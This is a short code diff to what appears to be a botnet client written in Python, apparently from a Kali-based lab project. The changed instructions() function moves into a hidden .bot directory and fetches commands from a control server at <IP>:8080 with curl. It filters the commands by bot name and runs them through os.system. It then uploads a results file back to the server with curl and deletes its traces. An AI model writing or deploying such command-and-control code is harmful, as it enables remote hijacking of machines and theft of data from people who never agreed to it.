@@ -44,12 +44,19 @@ def beacon():
 	starttime = time.time()
 
 def instructions():
+	dir = os.path.join('./','.bot')
+	os.chdir(dir)
 	os.system('curl <IP>:8080/instructions.txt > response.txt')
-	with open('/home/kali/project/webserver/response.txt') as input_file:
-		contents = input_file.read()
-		os.system(contents)
-		os.system('curl -d @/home/kali/project/webserver/sendthis.txt <IP>:8080/instructions.txt')
-		os.system('rm /home/kali/project/webserver/sendthis.txt /home/kali/project/webserver/response.txt')
+	with open('response.txt') as input_file:
+		myname = open('name.txt', 'r').read()
+		command = ''
+		for line in input_file:
+			bot = line.split("'")[0]
+			if bot == myname or bot == 'any':
+				command += line.split("'")[1]
+		os.system(command)
+		os.system('curl -d @./sendthis.txt <IP>/instructions.txt')
+		os.system('rm sendthis.txt response.txt')
 
 
 
